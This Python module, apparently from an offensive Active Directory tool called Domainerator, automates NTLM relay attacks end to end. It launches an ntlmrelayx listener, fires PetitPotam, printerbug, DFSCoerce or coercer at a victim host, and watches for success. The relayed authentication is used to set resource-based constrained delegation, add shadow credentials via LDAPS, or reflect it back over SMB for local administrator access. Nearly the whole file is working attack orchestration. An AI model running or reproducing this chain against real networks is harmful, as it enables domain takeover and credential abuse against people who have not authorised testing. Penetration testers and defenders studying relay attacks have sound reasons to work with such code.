"""Relay orchestration: coordinate a background ntlmrelayx listener with a
coercion trigger as a single, teardown-safe action.

The classic NTLM-relay chains (coerce a machine's auth, relay it to LDAP(S) to
configure RBCD or add shadow credentials, or reflect it back to the same host)
require *two* processes running at once: a listener (``ntlmrelayx.py``) and a
trigger (``coercer`` / ``PetitPotam`` / ``printerbug``). Running them by hand
means juggling terminals and getting the timing right. This module sequences
them:

    1. Start ntlmrelayx in the background (listener).
    2. Wait until it reports it is serving.
    3. Fire the coercion at the victim, aimed at our listener.
    4. Watch the relay output for a success signal.
    5. Tear the listener down cleanly no matter what happened.

Domainerator still ships **no exploit code** - it orchestrates the external
tools the operator already has installed. Every command is built from session
variables and shown before anything runs.
"""

from __future__ import annotations

import enum
import re
import time
from dataclasses import dataclass, field

from ..paths import Capability
from ..runner import BackgroundProcess, ToolRunner


class RelayMode(enum.Enum):
    """What the relayed authentication is used for."""

    LDAP_RBCD = "ldap-rbcd"           # relay to LDAP(S) -> configure RBCD
    LDAP_SHADOW = "ldap-shadow"       # relay to LDAP(S) -> add shadow credentials
    REFLECTION = "reflection"         # relay coerced auth back to the same host (SMB)

    @property
    def description(self) -> str:
        return {
            RelayMode.LDAP_RBCD: (
                "Relay coerced auth to LDAP(S) on the DC and configure "
                "resource-based constrained delegation for a controlled account."
            ),
            RelayMode.LDAP_SHADOW: (
                "Relay coerced auth to LDAP(S) on the DC and add shadow "
                "credentials (msDS-KeyCredentialLink) to a target."
            ),
            RelayMode.REFLECTION: (
                "Reflect coerced authentication back to the originating host "
                "over SMB for local administrator access (self-relay)."
            ),
        }[self]

    @property
    def grants(self) -> Capability:
        return {
            RelayMode.LDAP_RBCD: Capability.RBCD,
            RelayMode.LDAP_SHADOW: Capability.RESET_PASSWORD,
            RelayMode.REFLECTION: Capability.LOCAL_ADMIN,
        }[self]


class CoercionMethod(enum.Enum):
    """Which coercion technique to trigger."""

    PETITPOTAM = "petitpotam"      # MS-EFSR
    PRINTERBUG = "printerbug"      # MS-RPRN
    DFSCOERCE = "dfscoerce"        # MS-DFSNM
    COERCER = "coercer"            # multi-method sweep via the 'coercer' tool


# Signals in ntlmrelayx output that indicate a relay landed / an action worked.
_RELAY_SUCCESS = re.compile(
    r"Authenticating against|Delegation rights|"
    r"Attribute msDS-AllowedToActOnBehalfOfOtherIdentity|"
    r"KeyCredential|Shadow credential|"
    r"Dumping domain info|Enumerating relayed user|"
    r"was set successfully|SMBD-Thread.*Authenticating",
    re.IGNORECASE,
)

# Signals that ntlmrelayx is up and serving (so it is safe to fire coercion).
_RELAY_READY = re.compile(
    r"Servers started|Setting up SMB Server|Setting up HTTP Server|"
    r"Protocol Client .* loaded|Running in relay mode",
    re.IGNORECASE,
)


@dataclass
class RelayPlan:
    """A fully-resolved relay plan ready to display and execute."""

    mode: RelayMode
    coercion: CoercionMethod
    relay_argv: list[str]
    coercion_argv: list[str]
    listener_ip: str
    relay_target: str
    victim: str
    # Human-readable strings for display (secrets already masked upstream).
    relay_display: str = ""
    coercion_display: str = ""


@dataclass
class RelayResult:
    """The outcome of an orchestrated relay run."""

    success: bool
    detail: str
    capability: Capability | None
    relay_output: str
    coercion_output: str


class RelayError(Exception):
    """Raised when a plan cannot be built (missing required variables)."""


@dataclass
class RelayOrchestrator:
    """Builds and runs coordinated relay + coercion actions."""

    runner: ToolRunner
    # How long to wait for the listener to report ready before firing coercion.
    ready_timeout: float = 15.0
    # How long to watch for a relay success signal after coercion fires.
    watch_timeout: float = 30.0
    # Poll interval while waiting/watching.
    poll_interval: float = 0.5
    # Injected clock/sleep for testability.
    _sleep: callable = field(default=time.sleep)
    _now: callable = field(default=time.monotonic)

    # --- command building -----------------------------------------------
    def build_plan(
        self,
        mode: RelayMode,
        coercion: CoercionMethod,
        *,
        listener_ip: str | None,
        relay_target: str | None,
        victim: str | None,
        domain: str | None,
        username: str | None,
        password: str | None,
    ) -> RelayPlan:
        """Assemble the relay and coercion argv lists from provided values.

        Raises :class:`RelayError` with a clear message when a required value
        is missing so the console can prompt the operator to ``set`` it.
        """
        missing = []
        if not listener_ip:
            missing.append("LHOST (listener IP)")
        if not victim:
            missing.append("victim host to coerce")
        if mode in (RelayMode.LDAP_RBCD, RelayMode.LDAP_SHADOW) and not relay_target:
            missing.append("relay target (DC for LDAP relay)")
        if mode is RelayMode.REFLECTION and not relay_target:
            # For reflection the relay target is the victim itself.
            relay_target = victim
        if missing:
            raise RelayError("missing required value(s): " + ", ".join(missing))

        relay_argv = self._build_relay_argv(mode, relay_target)
        coercion_argv = self._build_coercion_argv(
            coercion,
            listener_ip=listener_ip,
            victim=victim,
            domain=domain,
            username=username,
            password=password,
        )

        return RelayPlan(
            mode=mode,
            coercion=coercion,
            relay_argv=relay_argv,
            coercion_argv=coercion_argv,
            listener_ip=listener_ip,
            relay_target=relay_target or "",
            victim=victim,
            relay_display=" ".join(relay_argv),
            coercion_display=self._redact(coercion_argv),
        )

    def _build_relay_argv(self, mode: RelayMode, relay_target: str) -> list[str]:
        if mode is RelayMode.LDAP_RBCD:
            return [
                "ntlmrelayx.py",
                "-t", f"ldaps://{relay_target}",
                "--delegate-access",
                "--no-dump", "--no-da", "--no-acl",
                "-smb2support",
            ]
        if mode is RelayMode.LDAP_SHADOW:
            return [
                "ntlmrelayx.py",
                "-t", f"ldaps://{relay_target}",
                "--shadow-credentials",
                "--no-dump",
                "-smb2support",
            ]
        # REFLECTION: relay back to the same host over SMB.
        return [
            "ntlmrelayx.py",
            "-t", f"smb://{relay_target}",
            "-smb2support",
        ]

    def _build_coercion_argv(
        self,
        coercion: CoercionMethod,
        *,
        listener_ip: str,
        victim: str,
        domain: str | None,
        username: str | None,
        password: str | None,
    ) -> list[str]:
        user = username or ""
        pw = password or ""
        dom = domain or ""

        if coercion is CoercionMethod.COERCER:
            argv = ["coercer", "coerce", "-t", victim, "-l", listener_ip]
            if user:
                argv += ["-u", user]
            if pw:
                argv += ["-p", pw]
            if dom:
                argv += ["-d", dom]
            return argv

        if coercion is CoercionMethod.PETITPOTAM:
            # PetitPotam.py listener victim [creds via env/args vary by build]
            argv = ["PetitPotam.py"]
            if user and dom:
                argv += ["-u", user, "-p", pw, "-d", dom]
            argv += [listener_ip, victim]
            return argv

        if coercion is CoercionMethod.PRINTERBUG:
            # printerbug.py 'domain/user:pass@victim' listener
            creds = _authstring(dom, user, pw, victim)
            return ["printerbug.py", creds, listener_ip]

        # DFSCOERCE: dfscoerce.py -u user -p pass -d domain listener victim
        argv = ["dfscoerce.py"]
        if user:
            argv += ["-u", user, "-p", pw, "-d", dom]
        argv += [listener_ip, victim]
        return argv

    # --- orchestration lifecycle ----------------------------------------
    def run(
        self,
        plan: RelayPlan,
        *,
        on_event: callable | None = None,
    ) -> RelayResult:
        """Execute the plan: start listener, wait ready, coerce, watch, tear down.

        ``on_event`` (optional) is called with human-readable progress strings
        so the console can stream status to the operator.
        """
        emit = on_event or (lambda _msg: None)

        emit(f"Starting listener: {plan.relay_display}")
        listener = self.runner.run_background(plan.relay_argv)

        if not listener.started:
            return RelayResult(
                success=False,
                detail=f"listener failed to start: {listener.error}",
                capability=None,
                relay_output=listener.output(),
                coercion_output="",
            )

        try:
            ready = self._wait_ready(listener, emit)
            if not ready:
                emit("Listener did not report ready; firing coercion anyway.")

            emit(f"Firing coercion: {plan.coercion_display}")
            coercion_out = self.runner.run(plan.coercion_argv)
            if coercion_out.error:
                emit(f"Coercion command error: {coercion_out.error}")

            emit("Watching relay for a success signal...")
            success, detail = self._watch_success(listener, emit)

            return RelayResult(
                success=success,
                detail=detail,
                capability=plan.mode.grants if success else None,
                relay_output=listener.output(),
                coercion_output=coercion_out.combined,
            )
        finally:
            emit("Tearing down listener.")
            listener.stop()

    def _wait_ready(self, listener: BackgroundProcess, emit: callable) -> bool:
        deadline = self._now() + self.ready_timeout
        while self._now() < deadline:
            if not listener.alive:
                # Died during startup - surface its output.
                emit("Listener exited during startup.")
                return False
            chunk = listener.read_new()
            if chunk:
                emit(chunk)
                if _RELAY_READY.search(chunk):
                    return True
            self._sleep(self.poll_interval)
        return False

    def _watch_success(
        self, listener: BackgroundProcess, emit: callable
    ) -> tuple[bool, str]:
        deadline = self._now() + self.watch_timeout
        while self._now() < deadline:
            chunk = listener.read_new()
            if chunk:
                emit(chunk)
                if _RELAY_SUCCESS.search(chunk):
                    return True, "relay success signal detected in listener output"
            if not listener.alive:
                # Listener may exit after a one-shot relay; check final output.
                final = listener.read_new()
                if final:
                    emit(final)
                if _RELAY_SUCCESS.search(listener.output()):
                    return True, "relay success signal detected (listener exited)"
                return False, "listener exited without a recognised success signal"
            self._sleep(self.poll_interval)
        return False, "timed out waiting for a relay success signal"

    # --- helpers ---------------------------------------------------------
    @staticmethod
    def _redact(argv: list[str]) -> str:
        """Mask the value following a password flag for display."""
        password_flags = {"-p", "--password"}
        out: list[str] = []
        mask = False
        for tok in argv:
            if mask:
                out.append("******")
                mask = False
                continue
            out.append(tok)
            if tok in password_flags:
                mask = True
        # Also mask an embedded 'user:pass@host' auth string.
        return re.sub(r"(:)[^:@/]+(@)", r"\1******\2", " ".join(out))


def _authstring(domain: str, user: str, password: str, victim: str) -> str:
    """Build a 'domain/user:pass@victim' impacket-style connection string."""
    prefix = f"{domain}/" if domain else ""
    creds = user
    if password:
        creds += f":{password}"
    return f"{prefix}{creds}@{victim}"
